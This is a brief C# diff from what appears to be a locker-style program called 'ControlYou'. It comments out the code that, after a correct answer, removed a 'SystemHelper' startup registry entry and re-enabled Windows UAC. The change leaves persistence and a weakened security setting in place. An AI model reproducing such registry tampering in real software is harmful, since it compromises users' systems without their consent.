@@ -83,11 +83,12 @@ namespace ControlYou
             {
                 canClose = true;
                 MessageBox.Show("정답이다!");
+                /*
                 RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                 rk.DeleteValue("SystemHelper");
 
                 RegistryKey rk2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
-                rk2.SetValue("EnableLUA", 1);
+                rk2.SetValue("EnableLUA", 1);*/
                 Application.Exit();
             }
             else {
